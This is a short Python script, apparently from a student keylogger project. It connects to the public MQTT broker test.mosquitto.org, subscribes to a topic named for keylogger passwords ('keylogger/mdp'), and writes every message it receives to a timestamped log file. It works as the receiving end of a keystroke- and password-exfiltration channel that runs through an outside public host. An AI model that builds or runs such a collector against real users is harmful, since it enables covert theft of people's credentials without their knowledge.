import time

import paho.mqtt.client as mqtt

HOST = "test.mosquitto.org"
PORT = 1883
file = f"log_{time.time()}.txt"


def on_message(client, userdata, msg):
    with open(file, 'a', encoding='utf8') as f:
        print(bytes(msg.payload).decode('utf8'), file=f)


client = mqtt.Client()
client.on_message = on_message

try:
    client.connect(HOST, PORT)
except:
    print("Connection Failed")
    exit()

try:
    client.subscribe('test/projet/keylogger/mdp', qos=2)
    client.loop_forever()


except KeyboardInterrupt:
    client.disconnect()
